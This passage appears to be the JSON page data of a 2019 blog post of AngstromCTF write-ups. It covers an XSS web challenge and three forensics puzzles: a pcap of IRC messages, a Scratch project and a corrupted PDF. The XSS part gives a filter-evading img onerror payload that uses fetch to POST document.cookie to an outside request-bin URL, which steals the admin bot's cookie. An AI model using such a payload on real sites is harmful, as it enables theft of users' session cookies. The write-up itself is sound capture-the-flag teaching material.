extra open HTML tags, so even doing <code>&#x3C;b>hi&#x3C;/b></code> triggers the removal of the entire document but interestingly, <code>&#x3C;/b>hi</code> doesn't. So if we can find a way to get some XSS going without using <code>&#x3C;script>&#x3C;/script></code>, we should be able to get the flag. Checking the <a href=\"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\">XSS Filter Evasion Cheat Sheet</a> and browsing through some attacks, we settle on <code>&#x3C;Img src = x onerror = \"javascript: {payload}\"></code>.\nWe can test that this works by trying <code>&#x3C;Img src = x onerror = \"javascript: alert(1)\"></code> and seeing that an alert pops up when we view the post page.\nNow that we have a working XSS attack, we need to get the flag. We know the flag is stored as a cookie, so if we can somehow read the cookie from the admin's browser, we get the flag. Since the post website is on the same domain as the domain that the cookie is set for, <code>document.cookie</code> will return a string containing the flag. So the idea is to write a script that will get this value and send it to us. We can use a simple <a href=\"https://pipedream.com/\">request bin</a> to capture the requests. Our XSS attack should look something like this: <code>&#x3C;Img src = x onerror = \"javascript: fetch('https://enymfhr00jcem.x.pipedream.net/', { method: 'POST', body: document.cookie })\"/></code>. We create the post, report it to the admin and check our request bin for the flag.</p>\n<span class=\"gatsby-resp-image-wrapper\" style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 341px; \">\n      <a class=\"gatsby-resp-image-link\" href=\"/static/c2d9f422e69f908cb99b55b2422489de/4c0ad/angstromctf-dom-validator-flag.png\" style=\"display: block\" target=\"_blank\" rel=\"noopener\">\n    <span class=\"gatsby-resp-image-background-image\" style=\"padding-bottom: 66%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB2ElEQVQ4y52SzWtTQRTF315cWaw2NNKUVmtbP0gx6kargv+L4FYQ9/4Xoo2pIKQpNQpicKfQVTcutItaTEjykvfykkjT9zHz5iczSUurYEMuHObMXObMufeOtf2zgu14VG2HWsM1qDdbNNz2SLC0QLvTxXFcytU6lZpNGEWMGkZQh5ASKePD9SjX67CwGq5nBF1PW/aQUmJ3I7abAXthDCpm3/dRakiHttMyJI7jARRSQSgVf2sopU6EpRupe+a02nid34SRwHFaeO0OjaYelMOvShXH65gHThTUE9bhByGREMg4pueHBGHEfhDS8wNTsn50KId2s1+yvqAdCiHpRfC9EbLTEgRCaVumHdIM6f84dCiEYK/n9ycL2CE4YoRvcyCojozx6+YWL169Jbta4GU2z0ouTza3dhyra6y87ucO8rk361j1Qcnmv4m+pUePn3HqzDzJmdskUhkSqZtMpDKcu7DEeHLJ8LHEdRLTt5iYynB+6gbjyTSnxy5juV73H9tPnj7n7GSahfRD5q494NKVe8wu3DWYu3qf2UXNl835xcVlg5n5O0xOZ7C+/dihXLXZLdfYrdQM/7K5RX7jI+vFEoV3nygUS4Yfw/sShWI/VxjsNz585g+cRpYhM2JdxgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"></span>\n  <img class=\"gatsby-resp-image-image\" alt=\"angstromctf dom validator flag\" title=\"angstromctf dom validator flag\" src=\"/static/c2d9f422e69f908cb99b55b2422489de/4c0ad/angstromctf-dom-validator-flag.png\" srcset=\"/static/c2d9f422e69f908cb99b55b2422489de/8a4e8/angstromctf-dom-validator-flag.png 150w,\n/static/c2d9f422e69f908cb99b55b2422489de/5a46d/angstromctf-dom-validator-flag.png 300w,\n/static/c2d9f422e69f908cb99b55b2422489de/4c0ad/angstromctf-dom-validator-flag.png 341w\" sizes=\"(max-width: 341px) 100vw, 341px\" style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\" loading=\"lazy\" decoding=\"async\">\n  </a>\n    </span>\n<h3>Notes</h3>\n<p>I spent a bit of time trying to work with an XSS attack that should have worked but didn't. The issue was that I was testing with Firefox, but the server is using Chrome, which has some extra XSS protection features!</p>\n<hr>\n<h1>Misc</h1>\n<h2>Paper Trail</h2>\n<h3>Misc - 50 points (solved)</h3>\n<blockquote>\n<p>Something is suspicious about defund's math papers. See if you can find anything in the network packets we've intercepted from his computer.</p>\n<p>Author: defund</p>\n</blockquote>\n<hr>\n<h2>Solution</h2>\n<p>We are given a packet capture file. You could open this in wireshark and analyse it there, but I decided to run <code>strings</code> on it first.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> strings paper_trail.pcapng\nIntel<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span> Xeon<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span> CPU E5-2676 v3 @ <span class=\"token number\">2</span>.40GHz <span class=\"token punctuation\">(</span>with SSE4.2<span class=\"token punctuation\">)</span>\nLinux <span class=\"token number\">4.15</span>.0-1032-aws\nDumpcap <span class=\"token punctuation\">(</span>Wireshark<span class=\"token punctuation\">)</span> <span class=\"token number\">2.6</span>.6 <span class=\"token punctuation\">(</span>Git v2.6.6 packaged as <span class=\"token number\">2.6</span>.6-1~ubuntu18.04.0<span class=\"token punctuation\">)</span>\neth0\nLinux <span class=\"token number\">4.15</span>.0-1032-aws\nPRIVMSG defund :I have to confide <span class=\"token keyword\">in</span> someone, even <span class=\"token keyword\">if</span> it<span class=\"token string\">'s myself\n:defund!~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :I have to confide in someone, even if it'</span>s myself\n<span class=\"token comment\">#i=)</span>\nPRIVMSG defund :my publications are all randomly generated :<span class=\"token punctuation\">(</span>\nF:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :my publications are all randomly generated :<span class=\"token punctuation\">(</span>\nN6qB\nPRIVMSG defund :a\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :a\nPRIVMSG defund :c\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :c\nPRIVMSG defund :t\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :t\nPRIVMSG defund :f\nZ:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :f\nPRIVMSG defund :<span class=\"token punctuation\">{</span>\n*:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :<span class=\"token punctuation\">{</span>\nPRIVMSG defund :f\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :f\nPRIVMSG defund :a\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :a\nPRIVMSG defund :k\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :k\nPRIVMSG defund :e\nR:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :e\nj+<span class=\"token punctuation\">\\</span>U\nu<span class=\"token punctuation\">{</span>PRIVMSG defund :_\n<span class=\"token operator\">!</span>:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :_\nwoPING chat.freenode.net\nz:y@\n:barjavel.freenode.net PONG barjavel.freenode.net :chat.freenode.net\nxiPRIVMSG defund :m\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :m\nycPRIVMSG defund :a\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :a\n<span class=\"token punctuation\">{</span>WPRIVMSG defund :t\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :t\n<span class=\"token punctuation\">}</span>KPRIVMSG defund :h\n ,R<span class=\"token operator\">></span>\na:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :h\n?PRIVMSG defund :_\n<span class=\"token number\">1</span>:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :_\n3PRIVMSG defund :p\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :p\n'PRIVMSG defund :a\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :a\nPRIVMSG defund :p\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :p\n$,q<span class=\"token punctuation\">)</span>\nPRIVMSG defund :e\n$,q:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :e\n<span class=\"token variable\">$4B</span><span class=\"token punctuation\">)</span>\nPRIVMSG defund :r\n<span class=\"token variable\">$4B</span>:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :r\nPRIVMSG defund :s\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :s\n$<span class=\"token operator\">&lt;</span>j<span class=\"token punctuation\">)</span>\nPRIVMSG defund :<span class=\"token punctuation\">}</span>\n:defund<span class=\"token operator\">!</span>~defund@ec2-18-209-123-192.compute-1.amazonaws.com PRIVMSG defund :<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\nCounters provided by dumpcap</code></pre></div>\n<p>We can see something that looks like the flag by reading the last character of some of the lines. We can read it manually or use some simple commands to get the flag.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> strings paper_trail.pcapng -n <span class=\"token number\">70</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -o <span class=\"token string\">'.$'</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> -d <span class=\"token string\">'\\n'</span> <span class=\"token operator\">|</span> <span class=\"token function\">cut</span> -b <span class=\"token number\">4</span>-\nactf<span class=\"token punctuation\">{</span>fake_math_papers<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2>Scratch It Out</h2>\n<h3>Misc - 60 points (solved)</h3>\n<blockquote>\n<p>An oddly yellow cat handed me this message - what could it mean?</p>\n<p>Author: innoviox</p>\n</blockquote>\n<hr>\n<h2>Solution</h2>\n<p>We are given a json file named <code>project.json</code>.\nReading the title and challenge description, we are reminded of <a href=\"https://scratch.mit.edu/\">MIT's Scratch</a> from when we were little.\nAfter googling about Scratch's project structure and how to <a href=\"https://en.scratch-wiki.info/wiki/Exporting_and_Importing\">import and export</a> projects, we import the given project into Scratch and run it to get the flag.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 281px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a3824ef071bd8e223bab31c8290d41cd/6b1e2/scratch-cat.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAABz0lEQVQ4y5WSy07bQBSG8wg8SNfdoPYtuuqq7wFSN11XgkqlEgIpUhbddNFuKlUqUKQIAQEJRMmtODdih9ghie3M2OPxj+bEtgbaXHqkIx9rzv/NuUwOicVxTK4siiKEYYgoElMXAkKEWjx1lZPGUkrS5nRg+uWcgwcBXNfHeOzB83wwxjF2PbieD8+bwPcZQiEwmXDKC4KAtH8B1U3q5lbbRLXeRKVqoH7TRtfso37Tgmn10Wx16dx27tHumLB6DmmU9p9AxhiJbrs9Evb7AywyVeEjoA4NRQTOGf0LbWazXFWnPJuhvhAR+HBHNlggEXD+aPDzPNVnwHRLLASqX95g0Cjif42WkpJpfpHAqH2M5kkBxo91qCaG5jXi5LK0k1meVajash0HvTsbh5/XUPm+js7X1zjfeo7Lwit6g/qM5xkBnfshKpUy6o1bXNTucP1zA1cfn6H4YRV/irtJP3J5YCwFTkslfMu/xdnxAWzjCI1f7zEcT2BbDSRPfklgHFHw+2Ab1qcVlPc2Ucu/QPlwZ7p1IZZuNwHGVMGgcwmrtAuj8BKt/XdgxJGANvBZUP08F0+j7NAyzuC7oyRBLoQ9hWYVklgKLUEu3ape4QOvt4VFlTbnogAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flag\"\n        title=\"flag\"\n        src=\"/static/a3824ef071bd8e223bab31c8290d41cd/6b1e2/scratch-cat.png\"\n        srcset=\"/static/a3824ef071bd8e223bab31c8290d41cd/8a4e8/scratch-cat.png 150w,\n/static/a3824ef071bd8e223bab31c8290d41cd/6b1e2/scratch-cat.png 281w\"\n        sizes=\"(max-width: 281px) 100vw, 281px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<hr>\n<h2>Paper Cut</h2>\n<h3>Misc - 190 points (solved)</h3>\n<blockquote>\n<p>defund submitted a math paper to a research conference and received a few comments from the editors. Unfortunately, we only have a <a href=\"paper_cut.pdf\">fragment</a> of the returned paper.</p>\n<p>Author: defund</p>\n</blockquote>\n<hr>\n<h2>Solution</h2>\n<p>We are given a pdf file that doesn't seem to open as it is corrupted. Guessing from the title and description of the challenge, our task is probably to repair this pdf. We could look up the <a href=\"https://resources.infosecinstitute.com/pdf-file-format-basic-structure/\">structure of a pdf file</a> to learn more about what our file should look like.</p>\n<p><img src=\"https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110612_1237_PDFFileForm2.png\" alt=\"https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/110612_1237_PDFFileForm2.png\"></p>\n<p>So viewing the plaintext of the pdf file, it looks like we've been given the header and the body parts of the pdf. We can use <a href=\"https://www.ghostscript.com/\">ghostscript</a> to see if it can automatically repair the pdf for us.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> gs -o repaired.pdf -sDEVICE<span class=\"token operator\">=</span>pdfwrite paper_cut.pdf\nstscript <span class=\"token number\">9.27</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2019</span>-04-04<span class=\"token punctuation\">)</span>\nCopyright <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> <span class=\"token number\">2018</span> Artifex Software, Inc.  All rights reserved.\nThis software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:\nsee the <span class=\"token function\">file</span> COPYING <span class=\"token keyword\">for</span> details.\n   **** Error: Cannot <span class=\"token function\">find</span> a <span class=\"token string\">'startxref'</span> anywhere <span class=\"token keyword\">in</span> the file.\n               Output may be incorrect.\n   **** Error:  An error occurred <span class=\"token keyword\">while</span> reading an XREF table.\n   **** The <span class=\"token function\">file</span> has been damaged.  This may have been caused\n   **** by a problem <span class=\"token keyword\">while</span> converting or transfering the file.\n   **** Ghostscript will attempt to recover the data.\n   **** However, the output may be incorrect.\n   **** Error:  Trailer dictionary not found.\n                Output may be incorrect.\n   No pages will be processed <span class=\"token punctuation\">(</span>FirstPage <span class=\"token operator\">></span> LastPage<span class=\"token punctuation\">)</span>.\n\n   **** This <span class=\"token function\">file</span> had errors that were repaired or ignored.\n   **** Please notify the author of the software that produced this\n   **** <span class=\"token function\">file</span> that it does not conform to Adobe's published PDF\n   **** specification.\n\n   **** The rendered output from this <span class=\"token function\">file</span> may be incorrect.</code></pre></div>\n<p>So ghostscript couldn't fully repair it for us, but we are now able to open the pdf which seems like a good thing. If we take a look at the file ghostscript has made for us, we notice that the data within the <code>stream/endstream</code> block is very small. So we take the stream contents from the original file and place them into the stream block of this new file with proper structure, and then we're able to open the file and view the flag.\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/664814fc4a47780febe2defbc35ca514/13a9a/angstromctf-paper-cut-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+0lEQVQoz32S2aqEQAxE/f/P80lfRlFxH3fH3Qwn0KID9waaTmepVEUtEZHzPPVgx3HIOI56m9hvzb7vsiyL/Bp56940z7O8329Z1/WK4VdV9WhKkkS2bVPQz+fzGGjxGIZB6rqW1+slQRDINE3SNI0URaFgjuOoDwhx27aVJXXUe54nXdcpsALSVJalTiMBOD7SAeFO01RzsAIMNRBBUZ7n+lbAu2QjGzY09n2vLDDAGMIKGMgBLIoi3fe1Q+OYG/phGIrv++rDDEZIRV6WZZpzXVfiOJa2bR97vBjCjITZJ0yIwRSWhgU1xM1HYJD54g/A+2/xl/2XN7kvI35uOYcPiPIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flag\"\n        title=\"flag\"\n        src=\"/static/664814fc4a47780febe2defbc35ca514/0a47e/angstromctf-paper-cut-flag.png\"\n        srcset=\"/static/664814fc4a47780febe2defbc35ca514/8a4e8/angstromctf-paper-cut-flag.png 150w,\n/static/664814fc4a47780febe2defbc35ca514/5a46d/angstromctf-paper-cut-flag.png 300w,\n/static/664814fc4a47780febe2defbc35ca514/0a47e/angstromctf-paper-cut-flag.png 600w,\n/static/664814fc4a47780febe2defbc35ca514/13a9a/angstromctf-paper-cut-flag.png 637w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<h3>Notes</h3>\n<p>Online tool to repair pdfs (uses ghostscript) - <a href=\"https://pdfresizer.com/repair\">pdfresizer</a></p>\n<hr>","frontmatter":{"date":"April 23, 2019","path":"/post/2019-04-23-angstromctf-2019-writeups","title":"AngstromCTF 2019 Writeups","tags":"ctf,infosec,writeup,crypto,web,misc"}}},"pageContext":{"prev":null,"next":{"fileAbsolutePath":"/media/winarch-shared/code/portfolio/src/posts/2019-04-28-uutctf-2019-writeups/index.md","frontmatter":{"title":"UUTCTF 2019 Writeups","date":"2019-04-28T00:00:00.000Z","path":"/post/2019-04-28-uutctf-2019-writeups"}}}},
    "staticQueryHashes": ["4146750380"]}